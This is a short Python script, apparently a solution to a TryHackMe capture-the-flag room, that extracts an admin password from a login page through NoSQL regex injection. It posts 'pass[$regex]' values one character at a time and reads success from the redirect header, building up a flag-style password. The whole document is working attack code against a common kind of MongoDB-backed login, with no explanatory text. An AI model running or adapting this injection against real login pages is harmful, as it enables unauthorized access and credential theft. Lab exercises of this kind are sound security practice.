import requests
import string

URL = 'http://10.10.191.255/login.php'
charset = '{_}' + string.ascii_letters + string.digits + string.punctuation
found = 'THM{password_acc'
session = requests.Session()

while True:
    for ch in charset:
        trial = found + ch
        data = {
            'user': 'admin',
            'pass[$regex]': f'^{trial}'
        }
        r = session.post(URL, data=data, allow_redirects=False)

        if '/?err=1' not in r.headers.get('Location', ''):
            found += ch
            print(f'Found so far: {found}')
            break
    else:
        print(f'Final password: {found}')
        break
